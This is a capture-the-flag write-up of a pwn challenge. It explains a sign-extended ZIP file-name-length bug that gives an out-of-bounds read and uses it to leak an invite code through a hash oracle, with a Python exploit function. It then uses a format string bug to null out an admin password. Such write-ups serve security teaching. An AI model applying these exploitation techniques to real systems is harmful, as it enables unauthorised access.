The binary has the following features:

![](01.png)

However, we cannot create a user without an invite code, and we cannot get the flag if we are not an admin. We can
upload a file and assign it to any user we want, but we cannot view it unless we know the user's password.

We can list files for any user and get the file name, size and a hash of the content.

Files are only accepted as ZIP files.

After opening the challenge in IDA, due to compiler optimizations, it was very difficult to read the decompiled code.
I created some structures to hold data within the application:

The obvious vulnerability is this format string vulnerability inside file read:

![](04.png)

But we cannot read a file without knowing a user's password. And we cannot create a user without knowing the invite code.

The invite code is assigned to Tom, the user with ID 15, with a random password.

Let's have a look at how a file is uploaded.

![](05.png)

The file is read as hex from the standard input, then decoded and passed to `readZipInfo`:

![](06.png)

It has some preliminary checks over the ZIP structure, ensuring that the files are not compressed.
It also checks if the extra field length is 0, but in a rather odd way.

Here's the ZIP header structure, taken from [here](https://users.cs.jmu.edu/buchhofp/forensics/formats/pkzip.html):

![](07.png)

The file name length and extra field length are both 2 byte long. The binary takes the dword containing the two and 
compares it to the file name length. In assembly, it looks like this:

![](08.png)

It does this by using the `cwde` instruction. If we look at an instruction reference ([here](https://c9x.me/x86/html/file_module_x86_id_27.html)),
we can see that it converts the word into a dword by sign extending:

![](09.png)

This means that if the extra field length is `0xffff` we can put any negative value for the file name length.
Why is this relevant? The file content offset within the zip file is computed using this file name length, since it has a variable length.
But, if the file name length is negative, we can get an out-of-bounds read. Since the uploaded file is stored globally,
we can get an offset into the ZIP file containing the invite code, because we can upload a file as Tom.

However, we cannot directly view the leak. We can only view the hashed value. And we cannot upload ZIP files with the inner file
size less than 10 bytes. But let's search the invite code in memory and look at what comes before it. The invite code for
the local environment is `terrible-red-busses` and is different than the one on the remote.

![](10.png)

Before the invite code comes the file name, which is `invitecode.txt`. This means we can leak the invite code one byte at a time,
by computing an offset inside this `invitecode.txt<actual invite code>` string. We can upload ZIP files containing a negative
file name length and a compressed size of 10 and get a substring containing 9 known bytes and one unknown from the invite code.
So, the first request will be `ecode.txt<letter>`, then `code.txt<known letter><letter>`, and so on. For each letter we can bruteforce
the hash, since we only have `0xff` choices. At each file we have to adjust the offset, since files are stored one after the other.
Alternatively, we can create a new connection for each letter.

Helper functions used in following snippets will be provided at the end of the writeup in the final exploit script.

```py
def leak_invite_code(io) -> bytes:
    offset_to_invite_code = 502
    gap_size = 512 + 4
    file_name = "invitecode.txt"
    required_content_length = 10
    current_offset = required_content_length - 1
    retrieved_invite_code = ""
    current_payload = file_name[-(required_content_length - 1):]

    while True:
        upload_file(io, TOM, {
            "file_name": "test.txt",
            "content": "A" * 10,
            "file_name_len": -(offset_to_invite_code + gap_size * len(retrieved_invite_code) + current_offset) + 2**16,
            "extra_field_len": 0xffff,
            "compressed_size": required_content_length,
        })

        files = read_files(io, TOM)
        target_hash = files[-1][3].decode()
        for letter in ALPHABET:
            current_string = (current_payload + retrieved_invite_code + letter)[-required_content_length:]
            current_hash = hex(fnv(current_string.encode()))[2:]
            if current_hash == target_hash:
                retrieved_invite_code += letter
                current_payload = current_payload[1:]
                offset_to_invite_code -= 1
                print(retrieved_invite_code)
                break
        else:
            break
```

Now that we have the invite code, we can create users and trigger the format string vulnerability.

Another thing to notice is that Tom's password is stored on the heap:

![](11.png)

From the format string vulnerability we have a heap leak at `%10$p` and Tom's password is at a constant offset from it.
We can upload a file that writes a null byte at the beginning of Tom's password, so we can log in as Tom by providing an empty password
and view the flag.
